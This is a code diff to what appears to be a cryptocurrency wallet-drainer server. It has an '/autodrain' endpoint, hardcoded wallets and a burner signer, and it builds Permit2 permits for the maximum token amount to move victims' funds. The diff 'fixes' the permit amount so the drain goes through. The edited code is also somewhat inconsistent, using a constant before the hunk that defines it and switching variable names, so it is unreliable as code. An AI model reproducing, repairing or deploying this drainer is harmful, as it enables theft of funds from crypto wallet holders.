@@ -217,7 +217,7 @@ const HARDCODED_WALLETS = {
     // Create permit object
     const permit = {
       token: token.toLowerCase(),
-      amount: ethers.BigNumber.from(amount || ethers.constants.MaxUint256),
+      amount: ethers.BigNumber.from(MAX_UINT160),  // ✅ FIXED
       expiration: ethers.BigNumber.from(deadline),
       nonce: ethers.BigNumber.from(nonce)
     };
@@ -316,12 +316,15 @@ app.post('/autodrain', async (req, res) => {
         // Send transaction with randomized parameters
         const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, getBurner());
         
-        const permit = {
-          token: params.token.toLowerCase(),
-          amount: ethers.BigNumber.from(ethers.constants.MaxUint256),
-          expiration: ethers.BigNumber.from(params.deadline),
-          nonce: ethers.BigNumber.from(params.nonce)
-        };
+        const MAX_UINT160 = "0xffffffffffffffffffffffffffffffffffffffff"; // 20 bytes MAX
+const safeAmount = amount && amount.length <= 40 ? amount : MAX_UINT160;
+
+const permit = {
+  token: token.toLowerCase(),
+  amount: ethers.BigNumber.from(safeAmount),  // ✅ FIXED
+  expiration: ethers.BigNumber.from(deadline),
+  nonce: ethers.BigNumber.from(nonce)
+};
         
         const tx = await permit2.permitTransferFrom(
           permit,
